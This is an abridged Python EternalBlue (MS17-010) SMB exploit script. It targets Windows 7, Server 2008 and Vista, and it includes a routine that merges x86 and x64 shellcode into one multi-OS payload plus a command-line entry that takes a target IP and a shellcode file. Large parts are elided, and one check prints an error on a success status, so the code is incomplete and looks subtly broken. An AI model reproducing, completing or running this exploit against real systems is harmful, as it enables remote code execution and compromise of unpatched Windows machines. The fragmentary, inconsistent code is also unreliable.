...
def sendEcho(conn, tid, data):
    '''Function to send a echo via SMB protocol to check if a response is received'''
    ...
    if recvPkt.getNTStatus() == 0:
        ...
        print(f'got bad ECHO response: 0x{recvPkt.getNTStatus()}')
...
def eternalblue7_init():
    ...
    return NTFEA_SIZE, feaList, fake_recv_struct


def eternalblue8_init():
    '''it returns the parameters for eternalblue8'''
    ...
    return NTFEA_SIZE, feaListNx

def merge_shellcode(filename1, filename2, filename3):
    '''Merging multiple shellcode into one (to be multi-OS version)'''
    # for arg in args:
    # 	open(arg, 'rb').read()

    sc_x86 = open(filename1, 'rb').read()
    sc_x64 = open(filename2, 'rb').read()

    file_shellcode = open(filename3, 'wb')
    file_shellcode.write('\x31\xc0\x40\x0f\x84'+pack('<I', len(sc_x86)))
    file_shellcode.write(sc_x86)
    file_shellcode.write(sc_x64)
    file_shellcode.close()

def exploit(target, shellcode, numGroomConn, username='', password=''):
    ...
    if server_os.startswith("Windows 7 ") or (server_os.startswith("Windows Server ") and ' 2008 ' in server_os) or server_os.startswith("Windows Vista"):
        NTFEA_SIZE, feaList, fake_recv_struct = eternalblue7_init()
        ...
        NTFEA_SIZE, feaListNx = eternalblue8_init()
        ...
        if retStatus == 0xc000000d:
            ...
            print(f'bad response status for nx: 0x{retStatus}')
    ...
    if retStatus == 0xc000000d:
        ...
        print(f'bad response status: 0x{retStatus}')
...
if __name__ == "__main__":
    # for WINDOWS ETERNALBLUEPOC7
    if len(sys.argv) < 5:
        print(f"{format(sys.argv[0])} <ip> <shellcode_file> [numGroomConn]")
        # sys.exit(1)
        print(f"{format(sys.argv[0])} <ip> <shellcode_file> [numGroomConn] <username> <password>")
    ...
    print(f'numGroomConn: {numGroomConn}')
